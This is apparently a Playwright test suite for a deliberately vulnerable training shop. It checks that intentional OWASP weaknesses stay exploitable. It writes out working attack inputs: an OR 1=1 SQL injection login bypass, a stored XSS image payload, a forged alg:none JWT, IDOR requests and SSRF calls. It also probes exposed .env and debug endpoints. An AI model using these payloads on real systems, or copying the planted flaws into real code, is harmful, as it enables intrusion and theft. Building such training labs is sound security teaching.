// @ts-check
// Vulnerability verification tests — confirm every intentional weakness is still triggerable.
// These tests SHOULD PASS. A failure means a vulnerability was accidentally fixed.
const { test, expect, request } = require('@playwright/test')
const { apiLogin, loginAs, BASE_URL } = require('./helpers')

// ── A01: Broken Access Control (IDOR) ──────────────────────────────────────────

test.describe('A01 — Broken Access Control', () => {
  test('IDOR: alice can read admin\'s order without ownership check', async () => {
    const aliceToken = await apiLogin('alice', 'password123')
    const res = await fetch(`${BASE_URL}/api/orders/1`, {
      headers: { Authorization: `Bearer ${aliceToken}` },
    })
    expect(res.status).toBe(200)
    const data = await res.json()
    // Order 1 belongs to admin, but alice can read it
    expect(data.order ?? data).toHaveProperty('id', 1)
  })

  test('IDOR: alice can read admin\'s user profile', async () => {
    const aliceToken = await apiLogin('alice', 'password123')
    const res = await fetch(`${BASE_URL}/api/users/1`, {
      headers: { Authorization: `Bearer ${aliceToken}` },
    })
    expect(res.status).toBe(200)
    const data = await res.json()
    expect(data.user ?? data).toHaveProperty('username', 'admin')
  })

  test('IDOR: alice can read admin\'s cart', async () => {
    const aliceToken = await apiLogin('alice', 'password123')
    const res = await fetch(`${BASE_URL}/api/cart/1`, {
      headers: { Authorization: `Bearer ${aliceToken}` },
    })
    expect(res.status).toBe(200)
  })

  test('Admin panel accessible without server-side auth check', async () => {
    const res = await fetch(`${BASE_URL}/api/admin/import-image?url=http://example.com`, {
      method: 'POST',
    })
    // Returns 200 with content — no auth required
    expect(res.status).toBe(200)
  })
})

// ── A02: Cryptographic Failures ────────────────────────────────────────────────

test.describe('A02 — Cryptographic Failures', () => {
  test('login response includes MD5 password hash in user object', async () => {
    const res = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: 'admin' }),
    })
    const data = await res.json()
    // admin's MD5('admin') = 21232f297a57a5a743894a0e4a801fc3
    expect(data.user.password).toBe('21232f297a57a5a743894a0e4a801fc3')
  })

  test('order response includes plaintext credit card number', async () => {
    const adminToken = await apiLogin('admin', 'admin')
    const res = await fetch(`${BASE_URL}/api/orders/1`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    })
    const data = await res.json()
    const order = data.order ?? data
    expect(order.credit_card).toMatch(/^\d{13,19}$/)
  })

  test('user profile returns plaintext credit card', async () => {
    const adminToken = await apiLogin('admin', 'admin')
    const res = await fetch(`${BASE_URL}/api/users/1`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    })
    const data = await res.json()
    const user = data.user ?? data
    expect(user.credit_card).toMatch(/^\d{13,19}$/)
  })
})

// ── A03: Injection ─────────────────────────────────────────────────────────────

test.describe('A03 — Injection', () => {
  test('SQL injection on login: bypass auth with OR 1=1', async () => {
    const res = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: "admin' OR '1'='1'--", password: 'anything' }),
    })
    expect(res.status).toBe(200)
    const data = await res.json()
    expect(data.token).toBeTruthy()
  })

  test('SQL injection on product search: returns all rows with OR 1=1', async () => {
    const legit = await fetch(`${BASE_URL}/api/products`).then(r => r.json())
    const injected = await fetch(`${BASE_URL}/api/products?q=' OR '1'='1`).then(r => r.json())
    // Injected query should return at least as many rows as legit
    const legitCount = (legit.products ?? legit).length
    const injectedCount = (injected.products ?? injected).length
    expect(injectedCount).toBeGreaterThanOrEqual(legitCount)
  })

  test('stored XSS: review body is rendered unescaped', async ({ page }) => {
    const token = await apiLogin('alice', 'password123')
    const payload = `<img src=x id="xss-marker" onerror="this.dataset.fired='true'">`

    // Submit XSS payload as a review on product 1
    await fetch(`${BASE_URL}/api/reviews`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
      body: JSON.stringify({ product_id: 1, rating: 5, body: payload }),
    })

    // Visit product page and verify the img tag was injected (not escaped)
    await page.goto('/products/1')
    const marker = page.locator('#xss-marker')
    await expect(marker).toBeAttached({ timeout: 8000 })
  })
})

// ── A04: Insecure Design ───────────────────────────────────────────────────────

test.describe('A04 — Insecure Design', () => {
  test('password reset token is MD5(email) — predictable', async () => {
    const res = await fetch(`${BASE_URL}/api/auth/reset`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'alice@example.com' }),
    })
    const data = await res.json()
    // Token should be returned directly in the response
    expect(data.token).toBeTruthy()
    // MD5('alice@example.com') = c160f8cc69a4f0bf2b0362752353d060
    expect(data.token).toBe('c160f8cc69a4f0bf2b0362752353d060')
  })

  test('coupon SAVE10 can be applied unlimited times', async () => {
    const aliceToken = await apiLogin('alice', 'password123')
    const aliceId = JSON.parse(Buffer.from(aliceToken.split('.')[1], 'base64url').toString()).id

    // Seed cart with one product so the order can be placed
    await fetch(`${BASE_URL}/api/cart/${aliceId}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${aliceToken}` },
      body: JSON.stringify({ product_id: 1, quantity: 1 }),
    })

    // Apply coupon — no rate-limit, can be used unlimited times (A04)
    const res = await fetch(`${BASE_URL}/api/orders/new`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${aliceToken}` },
      body: JSON.stringify({ coupon_code: 'SAVE10', credit_card: '4111111111111111', shipping_address: '1 Test St' }),
    })
    expect([200, 201]).toContain(res.status)
  })
})

// ── A05: Security Misconfiguration ────────────────────────────────────────────

test.describe('A05 — Security Misconfiguration', () => {
  test('debug endpoint exposes all environment variables', async () => {
    const res = await fetch(`${BASE_URL}/api/debug/info`)
    expect(res.status).toBe(200)
    const data = await res.json()
    expect(data.environment ?? data).toHaveProperty('JWT_SECRET')
  })

  test('uploads endpoint returns directory listing', async () => {
    const res = await fetch(`${BASE_URL}/api/uploads`)
    expect(res.status).toBe(200)
    const data = await res.json()
    const files = data.files ?? data
    expect(Array.isArray(files)).toBe(true)
    expect(files.length).toBeGreaterThan(0)
  })

  test('.env file is publicly accessible', async () => {
    const res = await fetch(`${BASE_URL}/.env`)
    expect(res.status).toBe(200)
    const text = await res.text()
    expect(text).toContain('JWT_SECRET')
  })

  test('package.json is publicly accessible', async () => {
    const res = await fetch(`${BASE_URL}/package.json`)
    expect(res.status).toBe(200)
    const data = await res.json()
    expect(data.dependencies).toBeTruthy()
    // Vulnerable versions present
    expect(data.dependencies.lodash).toBe('4.17.4')
  })

  test('default admin credentials work (admin/admin)', async () => {
    const res = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: 'admin' }),
    })
    expect(res.status).toBe(200)
  })
})

// ── A07: Identification and Authentication Failures ───────────────────────────

test.describe('A07 — Auth Failures', () => {
  test('username enumeration: different errors for bad user vs wrong password', async () => {
    const badUser = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'nosuchuser', password: 'pw' }),
    }).then(r => r.json())

    const badPass = await fetch(`${BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: 'wrongpw' }),
    }).then(r => r.json())

    expect(badUser.error).toBe('User not found')
    expect(badPass.error).toBe('Incorrect password')
    expect(badUser.error).not.toBe(badPass.error)
  })

  test('JWT with alg:none is accepted', async () => {
    // Forge a token with alg:none — no secret needed
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
    const payload = Buffer.from(JSON.stringify({ id: 1, username: 'admin', role: 'admin' })).toString('base64url')
    const forgedToken = `${header}.${payload}.`

    const res = await fetch(`${BASE_URL}/api/users/1`, {
      headers: { Authorization: `Bearer ${forgedToken}` },
    })
    expect(res.status).toBe(200)
    const data = await res.json()
    expect((data.user ?? data).username).toBe('admin')
  })
})

// ── A10: Server-Side Request Forgery ──────────────────────────────────────────

test.describe('A10 — SSRF', () => {
  test('import-image endpoint fetches arbitrary external URLs', async () => {
    const res = await fetch(`${BASE_URL}/api/admin/import-image?url=https://example.com`, {
      method: 'POST',
    })
    expect(res.status).toBe(200)
    const data = await res.json()
    // Returns content from the fetched URL
    expect(data.content ?? data).toBeTruthy()
    expect(data.status).toBe(200)
  })

  test('webhook registration triggers immediate server-side fetch', async () => {
    const aliceToken = await apiLogin('alice', 'password123')
    const res = await fetch(`${BASE_URL}/api/webhooks`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${aliceToken}` },
      body: JSON.stringify({ url: 'https://example.com' }),
    })
    // Webhook registered and fetched — no SSRF protection
    expect([200, 201]).toContain(res.status)
  })
})
